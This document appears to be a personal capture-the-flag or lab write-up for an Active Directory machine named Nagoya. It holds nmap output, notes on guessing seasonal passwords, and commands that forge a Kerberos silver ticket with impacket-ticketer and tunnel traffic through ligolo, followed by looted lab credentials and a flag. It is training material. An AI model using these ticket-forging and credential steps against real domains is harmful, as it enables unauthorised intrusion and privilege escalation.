# Nagoya \[Hard]

## Report



## Enumeration

192.168.237.21

```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-title: Nagoya Industries - Nagoya
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-08 04:31:04Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Issuer: commonName=nagoya.nagoya-industries.com
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-08T04:31:51+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

```

80

Error page showing this

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

### Files

Got the entire userlist

* No password reuse as username
* No NPUsers
* Tried password spraying with domain name but nah

### Initial Foothold

Guess username password by season + year combo

## PrivEsc

#### Creating Silver ticket and ligolo port forwarding

```
Get-Addomain
S-1-5-21-1969309164-1513403977-1686805993

SPN password hash (NT for Service1 [password of ms_sql service account])
E3A0168BC21CFB88B95C954A5B18F57C

Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
MSSQL/nagoya.nagoya-industries.com

impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
export KRB5CCNAME=Administrator.ccache

mssqlclient.py -k nagoya.nagoya-industries.com
```

But this won't work as port 1433 is inaccessible from outside.

Ligolo port forwarding, same as tunnel but add a new subnet

```
sudo ip route add 240.0.0.1/32 dev ligolo
nmap 240.0.0.1 to confirm
```

So all the target ports will be accessible at this IP

For -k auth we need a krb5.conf file too

```
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]

        NAGOYA-INDUSTRIES.COM = {
                kdc=nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM

```

But the ports are accessible at another IP compared to what our hosts file may suggest

So change that

```
192.168.179.21  nagoya-industries.com   
240.0.0.1       nagoya.nagoya-industries.com
```

Now this should work

```
mssqlclient.py -k nagoya.nagoya-industries.com
```

## Loot

### Creds

fiona.clark:Summer2023

craig.carr:Spring2023

```
svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg [crack exe file]
svc_mssql:Service1
christopher.lewis:newPassword123
```

### Flags

local:6faba351ed68f29082ced02ba30861ac

## Proof
